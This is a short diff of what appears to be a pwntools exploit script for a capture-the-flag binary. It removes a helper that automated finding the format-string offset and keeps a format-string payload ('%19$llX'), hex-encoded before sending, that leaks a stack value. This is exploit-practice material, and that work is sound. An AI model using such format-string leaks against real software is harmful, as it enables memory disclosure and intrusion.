@@ -34,20 +34,6 @@ def sd(data):
 def ru(data):
 	return p.recvuntil(data)
 
-def exec_fmt(payload):
-	p = process(target)
-	binhex = binascii.b2a_hex(payload)
-	p.recvuntil(" exit\n")
-	p.sendline("3")
-	p.recvuntil("\n")
-	p.sendline("0"*(len(binhex)))
-	p.recvuntil("\n")
-	p.sendline(binhex)
-	p.interactive()
-
-# autofmt = FmtStr(exec_fmt)
-# offset = autofmt.offset
-# print offset
 payload = "%19$llX"
 binhex = binascii.b2a_hex(payload)
 # print binhex
